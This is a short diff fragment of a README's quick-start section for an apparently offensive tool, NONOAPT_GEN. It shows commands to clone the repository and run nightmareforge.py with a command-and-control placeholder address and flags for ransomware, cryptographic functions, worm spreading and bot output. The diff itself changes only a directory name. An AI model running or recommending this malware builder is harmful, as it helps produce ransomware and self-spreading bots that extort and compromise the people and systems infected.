@@ -16,5 +16,5 @@ creator:teekay92
 ## Quick Start
 ```bash
 git clone https://github.com/teekay92/NONOAPT_GEN.git
-cd nightmareforge
+cd  NONOAPT_GEN
 python3 nightmareforge.py --c2 YOUR_IP:PORT --output bot --crypto --ransom --worm -v
